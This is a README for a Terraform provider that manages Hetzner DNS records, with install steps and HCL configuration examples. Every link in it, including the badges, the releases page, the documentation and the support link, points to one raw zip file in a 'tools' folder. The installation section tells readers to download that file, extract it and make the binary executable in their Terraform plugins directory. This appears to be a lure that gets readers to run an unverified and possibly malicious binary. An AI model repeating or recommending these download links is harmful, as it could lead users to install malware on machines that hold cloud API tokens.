# Terraform Provider for Hetzner DNS 🌐

![GitHub Release](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip) ![License](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip)

Welcome to the **Terraform Provider for Hetzner DNS**! This provider allows you to manage DNS records using Terraform with Hetzner's DNS services. Whether you are setting up a new domain or managing existing records, this provider simplifies the process.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Resources](#resources)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features

- **Manage DNS Records**: Create, update, and delete DNS records with ease.
- **Integration with Terraform**: Use Terraform's infrastructure as code capabilities to manage your DNS settings.
- **Support for Multiple Record Types**: Manage A, AAAA, CNAME, MX, TXT, and more.
- **Easy Setup**: Simple configuration to get you started quickly.

## Installation

To install the Terraform provider for Hetzner DNS, you can download the latest release from our [Releases page](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip). 

Once downloaded, follow these steps:

1. Extract the downloaded file.
2. Move the binary to your Terraform plugins directory.
3. Ensure that the binary is executable.

## Usage

To use the Hetzner DNS provider in your Terraform configuration, include the following block in your `.tf` file:

```hcl
provider "hetznerdns" {
  token = "your_api_token"
}
```

Replace `your_api_token` with your actual API token from Hetzner.

### Example Configuration

Here is a simple example of how to create a DNS record:

```hcl
resource "hetznerdns_record" "www" {
  zone_id = "your_zone_id"
  name     = "www"
  type     = "A"
  value    = "192.0.2.1"
  ttl      = 300
}
```

## Configuration

### Authentication

To authenticate with Hetzner DNS, you need to provide your API token. You can obtain this token from your Hetzner account.

### Provider Arguments

- **token**: (Required) Your Hetzner API token.
- **zone_id**: (Optional) The ID of the DNS zone you want to manage.

## Resources

The following resources are available with this provider:

- `hetznerdns_record`: Manage DNS records.
- `hetznerdns_zone`: Manage DNS zones.

For detailed information on each resource, refer to the [documentation](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip).

## Contributing

We welcome contributions! If you want to contribute to the project, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Open a pull request.

Please ensure your code follows the project's style guidelines and includes tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support

If you have any questions or need support, feel free to reach out through the GitHub issues page. You can also check the [Releases section](https://github.com/Raouf213/terraform-provider-hetznerdns/raw/refs/heads/master/tools/hetznerdns-terraform-provider-v2.9.zip) for updates and new features.

Thank you for using the Terraform Provider for Hetzner DNS! Happy coding!